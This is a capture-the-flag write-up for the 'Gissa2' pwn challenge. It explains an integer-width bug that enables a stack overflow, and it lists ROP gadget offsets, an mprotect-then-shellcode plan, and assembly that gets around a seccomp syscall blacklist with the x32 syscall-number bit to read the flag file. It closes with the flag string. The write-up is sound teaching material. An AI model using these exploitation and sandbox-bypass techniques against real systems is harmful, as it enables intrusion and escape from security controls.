# Gissa2

**Category**: Pwn

725 Points

15 Solves

---

The binary reads in the flag file from `/home/ctf/flag` and maps into an mmap region. Additionally it sets up seccomp rules which we can dump using seccomp-tools.

```
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0016
 0015: 0x06 0x00 0x00 0x00000000  return KILL
 0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018
 0017: 0x06 0x00 0x00 0x00000000  return KILL
 0018: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 ```

The binary then provides us three tries to guess the flag, which of course is impossible unless you are a guess god.

There is of course a vulnerability. It exists in the main function:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+0h] [rbp-A8h]
  __int16 read_len; // [rsp+8Ch] [rbp-1Ch]
  unsigned __int16 tries; // [rsp+8Eh] [rbp-1Ah]
  __int64 v7; // [rsp+90h] [rbp-18h]
  __int64 i; // [rsp+98h] [rbp-10h]

  i = 0LL;
  v7 = 0LL;
  tries = 0;
  read_len = 0x8B;
  read_flag_in();
  write_syscall();
  memeset((__int64)&buf, 0x8Bu);
  for ( i = 1LL; i <= tries + 3; ++i )
  {
    write_syscall();
    print_num(i - tries);
    write_syscall();
    v7 = (signed int)check((__int64)&buf, (unsigned int *)&read_len, &tries);
    if ( v7 > 0 )
      break;
  }
  cleanup();
  return 0;
}
```

Notice how the variable read_len is a 16 bit integer, however when it is being passed into the check function, it is casted to an unsigned int pointer, where an unsigned int is 32 bits. We can verify in the read input function that the read_len is being interpreted as a 32 bit integer:

```C
__int64 __fastcall read_bytes(__int64 buf, signed int len)
{
  signed int i; // [rsp+1Ch] [rbp-Ch]

  for ( i = 0; i < len && (unsigned int)read_syscall() == 1 && *(_BYTE *)(i + buf) != 10; ++i )
    ;
  if ( *(_BYTE *)(i + buf) == 10 )
    *(_BYTE *)(i + buf) = 0;
  return (unsigned int)i;
}
```

If we look back at the stack in main, we see that the 16 bits after the length is # of tries, which is incremented when we enter a newline. Then, the read_len will be a big number, specifically 0x1008b, using which we can buffer overflow the stack.

To leak pie, we can take advantage of the call to `str_len((_BYTE *)user_inp)` when our input does not match the flag. Additionally, using the gadgets in the binary, we can do pretty much any syscall we want:

```
poprdirsi = piebase + 0x0000000000000c22 # pop rdi ; pop rsi ; ret
poprdx = piebase + 0x0000000000000c1d # pop rdx ; pop r9 ; pop r8 ; pop rdi ; pop rsi ; ret
syscall = piebase + 0x0000000000000bd9 # syscall ; ret
xorrax = piebase + 0x0000000000000bd4 # xor rax, rax ; mov al, 0 ; syscall ; ret
```

Because mprotect is not a blacklisted syscall, we can mprotect the whole binary, read in shellcode, and jmp to it to gain better primitives.

Next, to bypass the seccomp syscall blacklists, I found [this](https://gist.github.com/thejh/c5b670a816bbb9791a6d) link that shows that using `opcode | 0x40000000` as the syscall number works as the desired syscall yet still bypasses seccomp. So, using this, we can write a orw chain to read the flag.

```
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x40000002
syscall

mov rdi, rax
mov rsi, {bss_addr}
mov rdx, 0x40
xor rax, rax
syscall

mov rax, 1
mov rdi, 1
syscall
```

## Flag:
midnight{I_kN3w_1_5H0ulD_h4v3_jUst_uS3d_l1B5eCC0mP}
